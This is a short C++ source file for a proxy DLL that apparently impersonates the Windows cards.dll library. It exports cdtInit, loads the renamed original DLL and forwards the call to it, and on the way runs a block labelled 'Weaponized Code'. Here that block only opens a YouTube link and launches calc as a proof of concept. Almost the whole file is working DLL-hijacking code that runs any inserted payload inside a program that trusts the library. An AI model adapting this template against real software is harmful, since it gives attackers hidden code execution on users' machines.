#include <iostream>
#include <windows.h>

#define EXTERN_DLL_EXPORT extern "C" __declspec(dllexport)

typedef BOOL(WINAPI* cdtInitPtr)(int* width, int* height);

EXTERN_DLL_EXPORT BOOL APIENTRY DllMain(HANDLE hModule, DWORD ulReasonForCall, LPVOID lpReserved) {
  {
    switch (ulReasonForCall) {
      case DLL_PROCESS_ATTACH:
      case DLL_PROCESS_DETACH:
      case DLL_THREAD_ATTACH:
      case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
  }
}

EXTERN_DLL_EXPORT BOOL cdtInit(int* width, int* height) {
  HINSTANCE loadedDLL = LoadLibrary(TEXT("cards_original.dll"));
  if (!loadedDLL) {
    printf("Format messaged failed with 0x%lx\n", GetLastError());
    return FALSE;
  }

  cdtInitPtr proxiedFunc = (cdtInitPtr) GetProcAddress(loadedDLL, "cdtInit");
  if (!proxiedFunc)
    return FALSE;

  /**** Start Weaponized Code ****/

  system("start \"\" \"https://www.youtube.com/watch?v=ZmPArvsSii4\"");
  system("calc");

  /**** End Weaponized Code ****/

  FreeLibrary(loadedDLL);

  return proxiedFunc(width, height);
}


